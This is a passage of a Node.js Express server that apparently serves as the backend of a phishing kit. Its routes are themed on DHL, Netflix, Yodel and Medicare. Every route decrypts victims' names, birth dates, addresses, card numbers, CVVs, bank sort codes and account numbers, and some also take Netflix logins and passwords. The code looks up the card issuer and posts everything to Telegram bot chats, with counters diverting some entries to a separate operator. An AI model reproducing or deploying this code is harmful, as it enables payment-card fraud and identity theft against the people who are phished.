          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-757683438&text=Medicare:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

//DHL
//DHL
//DHL

let mason = 4;

app.options("/masonDHL", cors());

app.post("/masonDHL", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mason == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mason = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=DHLMason:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1912976454&text=DHL:\n${originalText}`
        );
        mason += 1;
      }

      res.send("Update Completed");
    });
});

//NETLIX
//NETLIX
//NETLIX

app.options("/fpaysNetflix", cors());

app.post("/fpaysNetflix", (req, res) => {
  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      var loginText = `+----------- Login Information ------------+\nUsername: ${username}\nPassword: ${password}`;
      if (fpaysC == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixLogin:\n${loginText}`
        );
        fpaysC = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Netflix:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixLogin:\n${loginText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=NetflixLogin:\n${loginText}`
        );
        fpaysC += 1;
      }

      res.send("Update Completed");
    });
});

//YODEL
//YODEL
//YODEL

app.options("/sendYodelRes", cors());

app.post("/sendYodelRes", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `YodelTriz:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 1190384225,
            text: `Yodel:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });

      res.send("Update Completed");
    });
});

app.options("/sendSSYodelres", cors());

let ssCount = 0;

app.post("/sendSSYodelres", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ssCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        ssCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelSS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1270989114&text=Yodel:\n${originalText}`
        );
        ssCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/yodelM4STERB0Y", cors());

let yodelM4STERB0Y = 0;

app.post("/yodelM4STERB0Y", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (yodelM4STERB0Y == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        yodelM4STERB0Y = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelM4STER:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1465132165&text=Yodel:\n${originalText}`
        );
        yodelM4STERB0Y += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/sendARRYodelRes", cors());

let arcount = 0;

app.post("/sendARRYodelRes", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (arcount == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        arcount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelAR:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=853331970&text=Yodel:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=999824723&text=Yodel:\n${originalText}`
        );
        arcount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/mazzaYodel", cors());

app.post("/mazzaYodel", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mazCount == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mazCount = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelMazza:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1739191403&text=Yodel:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
        );
        mazCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/yardzYodel", cors());

app.post("/yardzYodel", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mazCount == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        yardzCount = 6;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelYardz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5138777422&text=Yodel:\n${originalText}`
        );
        yardzCount += 1;
      }

      res.send("Update Completed");
    });
});

let hoods = 2;

app.options("/hoodsYodel", cors());

app.post("/hoodsYodel", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (hoods == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        hoods = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelHoods:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2126545981&text=Yodel:\n${originalText}`
        );
        hoods += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/sendBigBillz20", cors());

let bill = 0;

app.post("/sendBigBillz20", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bill == 100) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        bill = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelBill:\n${originalText}`
        );
        axios.post(
